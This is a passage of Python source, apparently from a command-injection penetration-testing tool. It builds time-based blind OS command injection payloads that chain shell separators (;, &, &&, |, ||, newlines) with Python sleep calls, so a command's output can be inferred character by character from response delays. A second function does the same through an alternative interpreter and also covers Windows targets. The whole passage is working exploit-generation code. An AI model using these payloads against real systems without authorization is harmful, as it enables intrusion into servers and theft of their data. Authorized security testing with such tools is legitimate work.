                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + _py_ordinal_expr(cmd, num_of_chars) + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + _py_ordinal_expr(cmd, num_of_chars) + separator +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + _py_ordinal_expr(cmd, num_of_chars) + " ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  payload = checks.sanitize_payload_newlines(payload)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  payload = ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    if chain is not None:
      payload = checks.windows_probe(chain, cmd, "==", ascii_char, timesec)

  else:
    if separator in (";", "\n", "\r\n"):
      payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator in ("&", "&&") and checks.substitution_nests():
      payload = separator + _py_timed_comparison(timesec, ascii_char,
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX)
    elif separator == "&":
      payload = (separator +
                 "[ " + str(ascii_char) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )

    elif separator == "&&" :
      ampersand = "&"
      payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\"" + settings.CMD_SUB_SUFFIX + separator +
                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )


    elif separator in ("|", "||"):
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\r\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
    else:
      pass

    payload = checks.terminate_payload(payload, separator)

  return checks.sanitize_payload_newlines(payload)

# eof
